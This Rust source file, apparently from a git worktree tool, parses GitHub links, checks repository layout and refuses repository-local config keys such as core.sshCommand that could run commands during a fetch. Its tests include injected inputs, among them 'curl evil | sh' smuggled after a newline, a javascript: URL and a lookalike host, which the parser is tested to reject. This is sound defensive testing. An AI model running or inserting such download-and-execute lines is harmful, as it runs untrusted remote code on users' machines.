fn remotes_in(dir: &str) -> Remotes {
    remote_keys_in(dir, r"^remote\..*\.url$")
}

pub(crate) fn remotes_gh_reads(dir: &str) -> Remotes {
    remote_keys_in(dir, r"^remote\..*\.(url|gh-resolved)$")
}

fn remote_keys_in(dir: &str, keys: &str) -> Remotes {
    let mut git = Command::new("git");
    git::local(git.args(["-C", dir, "config", "--get-regexp", keys])).env("LC_ALL", "C");
    Remotes::of(program::run(&mut git, ANSWER))
}

fn layout(dir: &str) -> Layout {
    let common = match git::common_within(dir, ANSWER) {
        Common::Of(common) => common,
        Common::Unsaid(why) if why.starts_with(BARE_UNREAD) => return Layout::InBare,
        Common::NoRepository | Common::Unsaid(_) => return Layout::Unsaid,
    };
    match projects::clone_of(&common, ANSWER) {
        Ok(CloneRoot::Of(root)) => Layout::Wt(root),
        Ok(CloneRoot::Worked) => Layout::Git,
        Ok(CloneRoot::NoBare) => Layout::BareElsewhere,
        Ok(CloneRoot::Unparsed(why)) => Layout::WtRefused(why),
        Err(_) => Layout::Unsaid,
    }
}

fn said(git: &mut Command) -> Option<String> {
    one_line(program::run(git, ANSWER).ok()?.answer().ok()?)
}

fn page(link: &Link) -> Result<Link, String> {
    let number = link.number.to_string();
    let repository = format!("{GITHUB}/{}", link.repository());
    let mut gh = Command::new("gh");
    gh.args(["issue", "view", &number, "--repo", &repository, "--json", "url", "--jq", ".url"]);
    let ran = program::run(&mut gh, ASKING)
        .map_err(|error| format!("gh issue view could not be run: {error}"))?;
    let said = ran.answer().map_err(|why| format!("gh issue view: {why}"))?;
    let said = String::from_utf8_lossy(&said);
    let said = said.trim();
    Link::parse(said).ok_or_else(|| format!("gh issue view said {said}, which is no link"))
}

fn base(dir: &str, remote: &str, branch: &str) -> Result<(), String> {
    let head = format!("refs/heads/{branch}");
    let mut git = Command::new("git");
    git::local(git.args(["-C", dir, "rev-parse", "--verify", "--quiet", &head]));
    if said(&mut git).is_some() {
        return Ok(());
    }
    let pushed = across(dir, "ls-remote", &[ORIGIN, &head])?;
    let pushed = String::from_utf8_lossy(&pushed);
    if pushed.lines().any(|line| line.split('\t').nth(1) == Some(head.as_str())) {
        return Ok(());
    }
    across(dir, "fetch", &[remote, &format!("HEAD:{head}")]).map(drop)
}

fn across(dir: &str, command: &str, args: &[&str]) -> Result<Vec<u8>, String> {
    let mut git = Command::new("git");
    git::local(git.args(["-C", dir, command]).args(args));
    let ran = program::run_alone(&mut git, MAKING)
        .map_err(|error| format!("git {command} could not be run: {error}"))?;
    ran.answer().map_err(|why| format!("git {command}: {why}"))
}

pub fn worktree(dir: &str, of: &Of) -> Result<Directory, Unready> {
    let mut luneta = Command::new(luneta()?);
    git::local(luneta.args(["worktree", "--repo", dir, "--", &of.to_string()]));
    let ran = program::run_alone(&mut luneta, MAKING)
        .map_err(|error| format!("luneta worktree could not be run: {error}"))?;
    worktree_said(ran)
}

fn worktree_said(ran: Ran) -> Result<Directory, Unready> {
    match ran {
        Ran::Ended { status, stdout, .. } if status.success() => {
            let printed = String::from_utf8_lossy(&stdout);
            let said = printed.strip_suffix('\n').filter(|said| !said.is_empty());
            let Some(said) = said else {
                return Err(Unready::InDoubt("luneta worktree said no worktree".to_owned()));
            };
            directory(said).ok_or_else(|| {
                Unready::InDoubt(format!("luneta worktree said {said}, which is no directory"))
            })
        },
        Ran::Ended { status, stderr, .. } => match failure(&String::from_utf8_lossy(&stderr)) {
            Some(why) => Err(Unready::Failed(why)),
            None => Err(Unready::InDoubt(format!("luneta worktree: {status}"))),
        },
        Ran::Stuck => Err(Unready::InDoubt(format!(
            "the worktree took longer than {} minutes to make",
            MAKING.as_secs() / 60
        ))),
    }
}

pub(crate) fn luneta() -> Result<PathBuf, String> {
    let this = env::current_exe()
        .map_err(|error| format!("luneta cannot tell where it is: {error}"))?;
    if this.file_name().is_some_and(|name| name == "luneta") {
        return Ok(this);
    }
    let beside = this.with_file_name("luneta");
    if beside.is_file() {
        return Ok(beside);
    }
    Err(format!("no luneta is beside {}, to make the worktree with", this.display()))
}

pub fn made(repo: &str, of: &Of) -> Result<PathBuf, String> {
    made_if(repo, of, |_| Ok(()))
}

pub fn made_landing(repo: &str, of: &Of, holders: &Holders) -> Result<PathBuf, String> {
    made_if(repo, of, |root| lands(root, holders))
}

fn made_if(
    repo: &str,
    of: &Of,
    lands: impl FnOnce(&Dir) -> Result<(), String>,
) -> Result<PathBuf, String> {
    git_reads(repo)?;
    let wt_add = |error| format!("wt add: {error:#}");
    let found = Repo::discover(Some(Path::new(repo))).map_err(wt_add)?;
    lands(&wt_made(repo)?)?;
    let made = add::run(&found, &of.to_string(), None, Fetch::Lazy).map_err(wt_add)?;
    Ok(made.path().to_owned())
}

pub fn followed(dir: &str) -> Result<(), String> {
    git_reads(dir)?;
    wt::cmd::follow::run(Path::new(dir)).map_err(|error| format!("{error:#}"))
}

pub fn fetched_upstream(dir: &str, branch: &str) -> Result<Upstream, String> {
    git_reads(dir)?;
    reaches_as_the_user_does(dir)?;
    wt::cmd::follow::fetch_upstream(Path::new(dir), branch).map_err(|error| format!("{error:#}"))
}

const REACHES: &str = concat!(
    r"^(core\.(sshcommand|gitproxy|askpass|alternaterefscommand)",
    r"|credential\..*helper|remote\..*\.uploadpack|protocol\.(.*\.)?allow)$",
);

fn reaches_as_the_user_does(dir: &str) -> Result<(), String> {
    let mut git = Command::new("git");
    git::local(git.args(["-C", dir, "config", "-z", "--show-scope", "--get-regexp", REACHES]))
        .env("LC_ALL", "C");
    let ran = program::run(&mut git, ANSWER)
        .map_err(|error| format!("git config could not be run: {error}"))?;
    if let Ran::Ended { status, stderr, .. } = &ran
        && status.code() == Some(1)
        && stderr.is_empty()
    {
        return Ok(());
    }
    let listed = ran
        .answer()
        .map_err(|why| format!("git config did not say how git reaches the remote: {why}"))?;
    let listed = String::from_utf8_lossy(&listed);
    let own = own_keys(&listed);
    if own.is_empty() {
        return Ok(());
    }
    Err(format!(
        "the repository's own config sets {}, which would run as git reached the remote, and \
         lunetad fetches by no repository's own way",
        own.join(", ")
    ))
}

fn own_keys(listed: &str) -> Vec<&str> {
    let fields: Vec<&str> = listed.split('\0').collect();
    let mut keys: Vec<&str> = fields
        .as_chunks::<2>()
        .0
        .iter()
        .filter(|[scope, _]| matches!(*scope, "local" | "worktree"))
        .filter_map(|[_, set]| match set.split_once('\n') {
            Some((_, "")) => None,
            Some((key, _)) => Some(key),
            None => Some(*set),
        })
        .collect();
    keys.dedup();
    keys
}

const UPSTREAMS: [Upstream; 5] = [
    Upstream::Untracked,
    Upstream::Current,
    Upstream::Advanced,
    Upstream::Rewritten,
    Upstream::Gone,
];

#[must_use]
pub fn upstream_word(found: Upstream) -> &'static str {
    match found {
        Upstream::Untracked => "untracked",
        Upstream::Current => "current",
        Upstream::Advanced => "advanced",
        Upstream::Rewritten => "rewritten",
        Upstream::Gone => "gone",
    }
}

#[must_use]
pub fn upstream_of_word(word: &str) -> Option<Upstream> {
    UPSTREAMS.into_iter().find(|found| upstream_word(*found) == word)
}

fn git_reads(dir: &str) -> Result<(), String> {
    let named = git::REPOSITORY_VARS.into_iter().find(|name| env::var_os(name).is_some());
    match named {
        Some(name) => {
            Err(format!("{name} is set, and git would take another repository for {dir}'s"))
        },
        None => Ok(()),
    }
}

fn wt_made(dir: &str) -> Result<Dir, String> {
    match layout(dir) {
        Layout::Wt(root) => Ok(root),
        Layout::WtRefused(why) => {
            Err(format!("{dir} is in a clone wt made in a folder luneta cannot keep: {why}"))
        },
        Layout::BareElsewhere => Err(format!(
            "{dir} is in a bare repository that is not a .bare, and wt would make the worktree \
             inside it; wt clone it first"
        )),
        Layout::InBare => Err(format!(
            "{dir} is in a bare repository, not in a worktree of it; {READ_BY_WORKTREES}"
        )),
        Layout::Git => Err(format!(
            "{dir} is in a clone git made, and wt would make the worktree in its .git; wt clone \
             it first"
        )),
        Layout::Unsaid => Err(format!("git did not say whether {dir} is in a clone wt made")),
    }
}

fn directory(path: &str) -> Option<Directory> {
    let real = fs::canonicalize(path).ok().filter(|real| real.is_dir())?;
    Directory::parse(real.into_os_string().into_string().ok()?).ok()
}

pub(crate) fn failure(stderr: &str) -> Option<String> {
    let lines: Vec<&str> = stderr.lines().map(str::trim).filter(|line| !line.is_empty()).collect();
    let why = lines.iter().rposition(|line| line.starts_with(WHY))?;
    lines[why..].join(", ").strip_prefix(WHY).map(str::to_owned)
}

#[cfg(test)]
mod tests {
    use std::os::unix::process::ExitStatusExt as _;
    use std::process::ExitStatus;

    use super::*;

    fn link() -> Link {
        Link::parse("https://github.com/cashubtc/cdk/pull/2736").expect("a link")
    }

    fn worked(dir: &str, pull: Option<&str>, here: bool) -> Worked {
        let pull = pull.map(|page| Link::parse(page).expect("a pull request's page"));
        Worked { dir: directory(dir), pull, here }
    }

    fn by_wt(by: Remote) -> Repository {
        Repository { by, layout: Layout::Wt(root()) }
    }

    fn root() -> Dir {
        Dir::parse("/w/cdk").expect("an absolute path")
    }

    fn of(repository: Repository) -> Looked {
        Looked::Of(repository, ORIGIN.to_owned())
    }

    const BY_GIT: Repository = Repository { by: Remote::Origin, layout: Layout::Git };

    const BY_BARE_ELSEWHERE: Repository =
        Repository { by: Remote::Origin, layout: Layout::BareElsewhere };

    const IN_BARE: Repository = Repository { by: Remote::Origin, layout: Layout::InBare };

    const UNSAID: Repository = Repository { by: Remote::Origin, layout: Layout::Unsaid };

    fn issue() -> Link {
        Link::parse("https://github.com/cashubtc/cdk/issues/2736").expect("a link")
    }

    fn directory(path: &str) -> Directory {
        Directory::parse(path.to_owned()).expect("an absolute path")
    }

    #[test]
    fn a_link_is_of_a_pull_request_or_of_a_page_of_one() {
        let pulled = |text: &str| Link::parse(text).map(|link| (link.to_string(), link.url()));
        let cdk = Some((
            "cashubtc/cdk#2736".to_owned(),
            "https://github.com/cashubtc/cdk/pull/2736".to_owned(),
        ));
        for text in [
            "https://github.com/cashubtc/cdk/pull/2736",
            "  https://github.com/cashubtc/cdk/pull/2736\n",
            "https://github.com/cashubtc/cdk/pull/2736/files",
            "https://github.com/cashubtc/cdk/pull/2736#issuecomment-1",
            "https://github.com/cashubtc/cdk/pull/2736?w=1",
            "http://www.github.com/cashubtc/cdk/pull/2736",
            "github.com/cashubtc/cdk/pull/2736",
        ] {
            assert_eq!(pulled(text), cdk, "{text:?}");
        }
        for text in [
            "https://github.com/cashubtc/cdk/discussions/2736",
            "https://github.com/cashubtc/cdk/pull/0",
            "https://github.com/cashubtc/cdk/pull/+1",
            "https://github.com/cashubtc/cdk/pull/",
            "https://github.com/cashubtc/pull/2736",
            "https://gitlab.com/cashubtc/cdk/pull/2736",
            "https://github.com.evil/cashubtc/cdk/pull/2736",
            "see https://github.com/cashubtc/cdk/pull/2736",
            "https://github.com/cashubtc/cdk/pull/2736 and more",
            "https://github.com/../cdk/pull/2736",
        ] {
            assert_eq!(pulled(text), None, "{text:?}");
        }
        assert_eq!(link().tab(), "#2736");
        assert_eq!(link().number().get(), 2736);
        assert_eq!(link().wt(), Of::Pull(link()));
    }

    #[test]
    fn a_link_spells_its_page_again_and_what_is_no_link_stays_out() {
        for text in [
            "",
            "-x",
            "file:///tmp/run.desktop",
            "javascript:alert(1)",
            "https://github.com/cashubtc/cdk/pull/2736\ncurl evil | sh",
        ] {
            assert_eq!(Link::parse(text), None, "{text:?}");
        }
        for text in [
            "https://github.com/cashubtc/cdk/pull/2736?\ncurl evil | sh",
            "https://github.com/cashubtc/cdk/pull/2736/\ncurl evil | sh",
        ] {
            assert_eq!(Link::parse(text).map(|link| link.url()), Some(link().url()), "{text:?}");
        }
    }

    #[test]
    fn a_link_is_of_an_issue_or_of_a_page_of_one() {
        for text in [
            "https://github.com/cashubtc/cdk/issues/2736",
            "github.com/CashuBTC/cdk/issues/2736#issuecomment-1\n",
        ] {
            let link = Link::parse(text).expect("an issue's link");
            assert_eq!(link.kind(), Kind::Issue, "{text:?}");
            assert!(link.is(&issue()), "{text:?}");
        }
        assert_eq!(issue().to_string(), "cashubtc/cdk#2736");
        assert_eq!(issue().url(), "https://github.com/cashubtc/cdk/issues/2736");
        assert_eq!(issue().tab(), "#2736");
        assert_eq!(issue().wt(), Of::Branch(Branch("issue-2736".to_owned())));
        assert!(issue().is(&link()));
        assert_eq!(Link::parse("https://github.com/cashubtc/cdk/issues/0"), None);
    }

    #[test]
    fn a_pull_request_s_link_is_one_with_no_scheme_and_no_address_is_a_branch() {
        let handed = |text: &str| Of::parse(text).map(|of| of.to_string());
        for text in [
            "github.com/cashubtc/cdk/pull/2736",
            "https://github.com/cashubtc/cdk/pull/2736/files",
        ] {
            assert_eq!(Of::parse(text), Ok(Of::Pull(link())), "{text:?}");
            assert_eq!(handed(text), Ok(link().url()), "{text:?}");
        }
        assert_eq!(handed("feat/of"), Ok("feat/of".to_owned()));
        assert_eq!(handed(" feat/of\n"), Ok("feat/of".to_owned()), "trimmed");
        assert_eq!(handed("feat#"), Ok("feat#".to_owned()), "git takes a # with no number");
        assert_eq!(handed("  "), Err("it names no branch".to_owned()));
        for text in ["#12", "cashubtc/cdk#2736", "fix#3"] {
            let said = format!("{text} names an issue or a pull request: paste its link");
            assert_eq!(handed(text), Err(said), "luneta reads {text} as a number on GitHub");
        }
        assert_eq!(
            Of::parse("github.com/cashubtc/cdk/issues/2736"),
            Err("cashubtc/cdk#2736 is an issue: make the worktree of its branch, issue-2736"
                .to_owned())
        );
        for text in [
            "github.com/cashubtc/cdk/discussions/1",
            "www.github.com/cashubtc",
            "https://gitlab.com/cashubtc/cdk/-/merge_requests/1",
        ] {
            assert_eq!(
                Of::parse(text),
                Err(format!("{text} is no pull request's link on github.com")),
                "{text:?}"
            );
        }
    }

    fn ssh_host(host: &str) -> Option<String> {
        (host == "github-work").then(|| "github.com".to_owned())
    }

    #[test]
    fn a_remote_is_of_a_repository_by_ssh_or_https_case_aside() {
        for url in [
            "git@github.com:cashubtc/cdk.git",
            "git@github.com:cashubtc/cdk",
            "https://github.com/cashubtc/cdk.git",
            "https://github.com/CashuBTC/CDK/",
            "ssh://git@github.com/cashubtc/cdk.git",
            "https://token@github.com/cashubtc/cdk",
            "git@github-work:cashubtc/cdk.git",
            "ssh://git@github-work:22/cashubtc/cdk",
        ] {
            assert!(link().of(url, ssh_host), "{url}");
        }
        for url in [
            "git@gitlab.com:cashubtc/cdk.git",
            "/srv/git/cdk.git",
            "/srv/github.com:cashubtc/cdk",
            "git@github.com:cdk",
            "git@github.com:lorenzolfm/cdk.git",
            "https://github-work/cashubtc/cdk",
        ] {
            assert!(!link().of(url, ssh_host), "{url}");
        }
    }

    #[test]
    fn a_remote_names_a_repository_on_github_by_its_host() {
        let of = |url| github_repository_of(url, ssh_host);
        assert_eq!(of("git@github.com:cashubtc/cdk.git"), Some(("cashubtc", "cdk")));
        assert_eq!(of("https://GitHub.com/lorenzolfm/cdk/"), Some(("lorenzolfm", "cdk")));
        assert_eq!(of("git@github-work:cashubtc/cdk.git"), Some(("cashubtc", "cdk")));
        for url in ["git@gitlab.com:cashubtc/cdk.git", "https://github-work/o/n", "/srv/git/cdk"] {
            assert_eq!(of(url), None, "{url}");
        }
    }

    #[test]
    fn a_remote_is_of_a_repository_on_the_host_it_is_asked_about() {
        let of = |url| url_is_of(url, ("git.example.com", "cashubtc", "cdk"), ssh_host);
        assert!(of("https://git.example.com/cashubtc/cdk.git"));
        assert!(!of("https://github.com/cashubtc/cdk.git"));
    }

    #[test]
    fn a_repository_is_the_pull_request_s_by_any_remote_its_origin_first() {
        let fork = "remote.cashubtc.url git@github.com:cashubtc/cdk.git\n\
                    remote.origin.url git@github.com:lorenzolfm/cdk.git\n\
                    remote.upstream.url https://github.com/cashubtc/cdk\n";
        assert_eq!(remote(fork, &link(), ssh_host).as_deref(), Some("cashubtc"));
        let clone = "remote.upstream.url https://github.com/cashubtc/cdk\n\
                     remote.origin.url https://github.com/cashubtc/cdk\n";
        assert_eq!(remote(clone, &link(), ssh_host).as_deref(), Some("origin"));
        let other = "remote.origin.url git@github.com:lorenzolfm/cdk.git\n";
        assert_eq!(remote(other, &link(), ssh_host), None);
        assert_eq!(remote("", &link(), ssh_host), None);
    }

    #[test]
    fn a_key_goes_to_the_view_with_the_branch_or_else_a_view_in_a_clone_of_the_repository() {
        let remotes = |dir: &str| match dir {
            "/cdk/main" | "/cdk/2736" => Some(by_wt(Remote::Other)),
            "/cdk-upstream/master" => Some(by_wt(Remote::Origin)),
            "/cdk-git" => Some(BY_GIT),
            _ => None,
        };
        let page = |repository, number| format!("https://github.com/{repository}/pull/{number}");
        let (cdk, before) = (page("CashuBTC/cdk", 2736), page("cashubtc/cdk", 2735));
        let fork = page("lorenzolfm/cdk", 2736);
        let away = [
            worked("/dots", None, true),
            worked("/cdk/main", None, false),
            worked("/cdk-upstream/master", None, false),
        ];
        assert_eq!(found(&link(), &away, remotes), Some(Found::InClone(2, root())));
        let here = [
            worked("/cdk/main", None, false),
            worked("/dots", None, true),
            worked("/cdk/main", None, true),
            worked("/cdk-upstream/master", None, false),
        ];
        assert_eq!(found(&link(), &here, remotes), Some(Found::InClone(2, root())));
        let by_git = [worked("/cdk-git", None, true), worked("/cdk/main", None, false)];
        assert_eq!(found(&link(), &by_git, remotes), Some(Found::InClone(1, root())));
        assert_eq!(found(&link(), &by_git[..1], remotes), None);
        let checked_out = [
            worked("/cdk/main", None, true),
            worked("/cdk-upstream/master", Some(&before), false),
            worked("/cdk-git", Some(&cdk), false),
        ];
        assert_eq!(found(&link(), &checked_out, remotes), Some(Found::There(2)));
        let fork = [worked("/cdk/main", Some(&fork), true)];
        assert_eq!(found(&link(), &fork, remotes), Some(Found::InClone(0, root())));
    }

    #[test]
    fn a_clone_is_the_first_by_its_origin_or_else_by_another_remote() {
        let dirs = ["/bare", "/git", "/unsaid", "/fork/main", "/b", "/upstream", "/fork"]
            .map(str::to_owned);
        let remotes = |dir: &str| match dir {
            "/fork/main" | "/fork" => Some(by_wt(Remote::Other)),
            "/upstream" => Some(by_wt(Remote::Origin)),
            "/bare" => Some(BY_BARE_ELSEWHERE),
            "/git" => Some(BY_GIT),
            "/unsaid" => Some(UNSAID),
            _ => None,
        };
        assert_eq!(cloned(&dirs, remotes), Some((5, root())));
        assert_eq!(cloned(&dirs[..5], remotes), Some((3, root())));
        assert_eq!(cloned(&dirs[..3], remotes), None);
    }

    #[test]
    fn with_no_clone_for_wt_luneta_says_of_one_git_made() {
        let seen = |seen: &[(&str, Looked)]| -> HashMap<String, Looked> {
            seen.iter().map(|(dir, it)| ((*dir).to_owned(), it.clone())).collect()
        };
        let stuck = || Looked::Unsaid("it did not answer in time".to_owned());
        assert_eq!(
            no_clone(&link(), &seen(&[("/dots", Looked::NotOf)])),
            Unready::Nowhere(
                "no session works in cashubtc/cdk, nor does zoxide know a clone of it; wt clone \
                 it first"
                    .to_owned()
            )
        );
        let by_git = || {
            Unready::Failed(
                "/w/cdk/src is in a clone of cashubtc/cdk that git made, and wt would make the \
                 worktree in its .git; wt clone it first"
                    .to_owned(),
            )
        };
        assert_eq!(
            no_clone(&link(), &seen(&[
                ("/dots", Looked::NotOf),
                ("/w/cdk/src", of(BY_GIT)),
            ])),
            by_git()
        );
        assert_eq!(
            no_clone(&link(), &seen(&[
                ("/a/cdk", of(UNSAID)),
                ("/w/cdk/src", of(BY_GIT)),
                ("/mnt/stuck", stuck()),
            ])),
            by_git()
        );
        let bare = Unready::Failed(
            "/w/cdk.git is in a bare clone of cashubtc/cdk that is not a .bare, and wt would make \
             the worktree inside it; wt clone it first"
                .to_owned(),
        );
        assert_eq!(
            no_clone(&link(), &seen(&[
                ("/a/cdk", of(UNSAID)),
                ("/w/cdk.git", of(BY_BARE_ELSEWHERE)),
                ("/mnt/stuck", stuck()),
            ])),
            bare
        );
        assert_eq!(
            no_clone(&link(), &seen(&[
                ("/w/cdk.git", of(BY_BARE_ELSEWHERE)),
                ("/w/cdk/src", of(BY_GIT)),
            ])),
            by_git()
        );
        let refused = Repository {
            by: Remote::Origin,
            layout: Layout::WtRefused("\"/w/c\\tdk\": a path holds a control character".to_owned()),
        };
        let unkept = Unready::Failed(
            "/w/c\tdk/main is in a clone of cashubtc/cdk that wt made in a folder luneta cannot \
             keep: \"/w/c\\tdk\": a path holds a control character"
                .to_owned(),
        );
        assert_eq!(
            no_clone(&link(), &seen(&[
                ("/a/cdk", of(UNSAID)),
                ("/w/c\tdk/main", of(refused.clone())),
            ])),
            unkept
        );
        assert_eq!(
            no_clone(&link(), &seen(&[
                ("/w/c\tdk/main", of(refused)),
                ("/w/cdk.git", of(BY_BARE_ELSEWHERE)),
            ])),
            bare
        );
        assert_eq!(
            no_clone(&link(), &seen(&[
                ("/a/cdk", of(UNSAID)),
                ("/v/cdk/.bare", of(IN_BARE)),
                ("/mnt/stuck", stuck()),
            ])),
            Unready::Failed(format!(
                "/v/cdk/.bare is in a bare repository of cashubtc/cdk, not in a worktree of it; \
                 {READ_BY_WORKTREES}"
            ))
        );
        let unsaid = || {
            Unready::Failed(
                "git did not say whether /a/cdk, of cashubtc/cdk, is in a clone wt made".to_owned(),
            )
        };
        assert_eq!(
            no_clone(&link(), &seen(&[("/dots", Looked::NotOf), ("/a/cdk", of(UNSAID))])),
            unsaid()
        );
        assert_eq!(
            no_clone(&link(), &seen(&[("/a/cdk", of(UNSAID)), ("/mnt/stuck", stuck())])),
            unsaid()
        );
        assert_eq!(
            no_clone(&link(), &seen(&[("/dots", Looked::NotOf), ("/mnt/stuck", stuck())])),
            Unready::Failed(
                "git did not say whether /mnt/stuck is of cashubtc/cdk: it did not answer in time"
                    .to_owned()
            )
        );
    }

    fn git(dir: impl AsRef<Path>, args: &[&str]) -> Option<String> {
        let mut git = Command::new("git");
        git::local(&mut git)
            .env("GIT_CONFIG_NOSYSTEM", "1")
            .env("GIT_CONFIG_GLOBAL", "/dev/null")
            .args(["-c", "user.name=t", "-c", "user.email=t@t", "-c", "commit.gpgsign=false"])
            .arg("-C")
            .arg(dir.as_ref())
            .args(args);
        let ran = git.output().unwrap();
        let said = String::from_utf8(ran.stdout).unwrap();
        ran.status.success().then(|| said.trim_end().to_owned())
    }

    #[test]
    fn an_issue_s_branch_is_made_from_its_repository_s_default_branch_as_it_is_now() {
        let scratch = tempfile::tempdir().unwrap();
        let path = |name: &str| scratch.path().join(name).to_str().unwrap().to_owned();
        let (cdk, fork, clone) = (path("cdk"), path("fork.git"), path("clone"));
        let empty = |dir: &str, message: &str| {
            assert!(git(dir, &["commit", "-q", "--allow-empty", "-m", message]).is_some());
        };
        assert!(git(scratch.path(), &["init", "-q", "-b", "main", &cdk]).is_some());
        empty(&cdk, "one");
        assert!(git(scratch.path(), &["clone", "-q", "--bare", &cdk, &fork]).is_some());
        assert!(git(scratch.path(), &["clone", "-q", &fork, &clone]).is_some());
        let github = "git@github.com:cashubtc/cdk.git";
        assert!(git(&clone, &["remote", "add", "cashubtc", github]).is_some());
        assert!(git(&clone, &["config", &format!("url.{cdk}.insteadOf"), github]).is_some());
        empty(&cdk, "two");
        let now = git(&cdk, &["rev-parse", "HEAD"]);
        let made = || git(&clone, &["rev-parse", "refs/heads/issue-2736"]);
        assert_eq!(base(&clone, "cashubtc", "issue-2736"), Ok(()));
        assert_eq!(made(), now);
        assert_eq!(git(&clone, &["config", "branch.issue-2736.remote"]), None);
        empty(&cdk, "three");
        assert_eq!(base(&clone, "cashubtc", "issue-2736"), Ok(()));
        assert_eq!(made(), now);
        assert!(git(&fork, &["branch", "issue-7", "main"]).is_some());
        assert_eq!(base(&clone, "cashubtc", "issue-7"), Ok(()));
        assert_eq!(git(&clone, &["rev-parse", "--verify", "-q", "refs/heads/issue-7"]), None);
    }

    #[test]
    fn why_no_worktree_was_made_comes_last_after_what_wt_says_as_it_goes() {
        let stderr = "  pull       #2736 (asking origin for its branch)\n\
                      luneta: wt add: wt cannot fetch origin/feat\n  run git fetch origin feat\n";
        assert_eq!(
            failure(stderr).as_deref(),
            Some("wt add: wt cannot fetch origin/feat, run git fetch origin feat")
        );
        assert_eq!(failure("  pull  #1\n"), None);
    }

    #[test]
    fn only_the_repository_s_own_way_of_reaching_a_remote_stops_a_fetch() {
        let listed = "global\0credential.https://github.com.helper\n\0\
                      global\0credential.https://github.com.helper\n!gh auth git-credential\0\
                      command\0core.sshcommand\nssh -i key\0\
                      local\0credential.helper\n\0\
                      local\0core.sshcommand\nssh -i other\0\
                      worktree\0remote.my origin.uploadpack\ngit-upload-pack\0\
                      local\0protocol.allow\0";
        let own = ["core.sshcommand", "remote.my origin.uploadpack", "protocol.allow"];
        assert_eq!(own_keys(listed), own);
        let scratch = tempfile::tempdir().unwrap();
        let tree = scratch.path().join("tree");
        let tree = tree.to_str().unwrap();
        assert!(git(scratch.path(), &["init", "-q", "-b", "main", tree]).is_some());
        assert_eq!(reaches_as_the_user_does(tree), Ok(()));
        assert!(git(tree, &["config", "core.sshCommand", "ssh -i other"]).is_some());
        let refused = reaches_as_the_user_does(tree).unwrap_err();
        assert!(refused.contains("sets core.sshcommand,"), "{refused}");
    }

    #[test]
    fn a_paste_is_asked_of_a_link_and_of_views_by_their_absolute_paths() {
        let cdk = "https://github.com/cashubtc/cdk/pull/2736";
        let worked = vec![worked("/w/cdk/main", Some(cdk), true), worked("/dots", None, false)];
        let pasted = Pasted::new(Work::Link(issue()), worked);
        let on = Some(On { destination: "nixos".to_owned() });
        assert_eq!(Pasted::of(pasted.asked(on.clone())), Ok((on, pasted.clone())));
        let refused = |request: PasteRequest| Pasted::of(request).map(drop).unwrap_err();
        let asked = |worked: Vec<AskedWorked>| PasteRequest { worked, ..pasted.asked(None) };
        let link = paste_request::Work::Link("github.com/cashubtc".to_owned());
        let unlinked = PasteRequest { work: Some(link), ..asked(Vec::new()) };
        assert_eq!(
            refused(unlinked),
            "link: \"github.com/cashubtc\" is no link of a pull request or of an issue on \
             github.com"
        );
        let view = |dir: &str, pull: Option<&str>| AskedWorked {
            dir: dir.to_owned(),
            pull: pull.map(str::to_owned),
            here: false,
        };
        let relative = asked(vec![view("w/cdk", None)]);
        assert_eq!(refused(relative), "worked: \"w/cdk\" is no absolute path");
        let unpaged = asked(vec![view("/w/cdk", Some("main"))]);
        assert_eq!(refused(unpaged), "worked: \"main\" is no pull request's page");
        let many = asked(vec![view("/w", None); 1025]);
        assert_eq!(refused(many), "worked: more than 1024 views");
        assert_eq!(
            refused(PasteRequest { work: None, ..asked(Vec::new()) }),
            "it says neither a link nor a file"
        );
    }

    #[test]
    fn a_paste_is_asked_of_a_file_by_its_path_and_its_row_s_directory() {
        for from in [Some(directory("/w/cdk/main")), None] {
            let file = File::parse("~/notes/plan.md", from).unwrap();
            let pasted = Pasted::new(Work::File(file), Vec::new());
            assert_eq!(Pasted::of(pasted.asked(None)), Ok((None, pasted)));
        }
        let refused = |path: &str, from: Option<&str>| {
            let file = AskedFile { path: path.to_owned(), from: from.map(str::to_owned) };
            let work = Some(paste_request::Work::File(file));
            let request = PasteRequest {
                on: None,
                work,
                worked: Vec::new(),
                at_head: false,
                reads_moved_off: false,
            };
            Pasted::of(request).map(drop).unwrap_err()
        };
        assert_eq!(refused("plan.txt", None), "file: \"plan.txt\" is no path of a .md file");
        assert_eq!(refused("plan.md", Some("w/cdk")), "from: \"w/cdk\" is no absolute path");
    }

    #[test]
    fn a_file_s_path_is_one_line_that_ends_in_md_and_names_its_branch() {
        for (text, path, stem) in [
            ("docs/plans/sync-rework.md", "docs/plans/sync-rework.md", "sync-rework"),
            ("  /w/plan.md\n", "/w/plan.md", "plan"),
            ("~/notes/My Plan (v2).md", "~/notes/My Plan (v2).md", "my-plan-v2"),
            ("README.md", "README.md", "readme"),
            ("2026-11-03_plan.md", "2026-11-03_plan.md", "2026-11-03_plan"),
            ("a..b.md", "a..b.md", "a-b"),
            ("x.lock.md", "x.lock.md", "x-lock"),
            ("--force.md", "--force.md", "force"),
            ("revisão.md", "revisão.md", "revisão"),
            ("main.md", "main.md", "main"),
        ] {
            let file = File::parse(text, None).unwrap_or_else(|| panic!("{text:?}"));
            let branch = format!("md-{stem}");
            assert_eq!((file.path(), file.branch()), (path, branch.clone()), "{text:?}");
            let check = git(".", &["check-ref-format", "--branch", &branch]);
            assert_eq!(check, Some(branch), "{text:?}");
            assert_eq!(Work::File(file.clone()).tab(), stem, "{text:?}");
        }
        for text in [
            "plan.txt",
            "plan.md and more",
            "plan.md/",
            "two\nlines.md",
            "https://example.com/plan.md",
            "github.com/cashubtc/cdk/blob/main/README.md",
            "www.github.com/cashubtc/cdk/blob/main/README.md",
            ".md",
            "docs/.md",
            "---.md",
            "",
        ] {
            assert_eq!(File::parse(text, None), None, "{text:?}");
        }
        let issue = "https://github.com/cashubtc/cdk/issues/2736";
        assert_eq!(Work::parse(issue, None), Some(Work::Link(self::issue())));
        let file = Work::parse("/w/plan.md", Some(directory("/w")));
        assert_eq!(file, File::parse("/w/plan.md", Some(directory("/w"))).map(Work::File));
    }

    #[test]
    fn a_file_is_read_where_it_is_and_its_repository_is_its_own_or_else_the_row_s() {
        let scratch = tempfile::tempdir().unwrap();
        let scratch = fs::canonicalize(scratch.path()).unwrap();
        let path = |name: &str| scratch.join(name).to_str().unwrap().to_owned();
        let (repo, row, notes) = (path("repo"), path("row"), path("notes"));
        for dir in [&repo, &row] {
            assert!(git(&scratch, &["init", "-q", "-b", "main", dir]).is_some());
        }
        fs::create_dir_all(scratch.join("repo/docs")).unwrap();
        fs::create_dir_all(&notes).unwrap();
        fs::write(scratch.join("repo/docs/plan.md"), "plan").unwrap();
        fs::write(scratch.join("notes/plan.md"), "plan").unwrap();
        fs::create_dir(scratch.join("notes/dir.md")).unwrap();
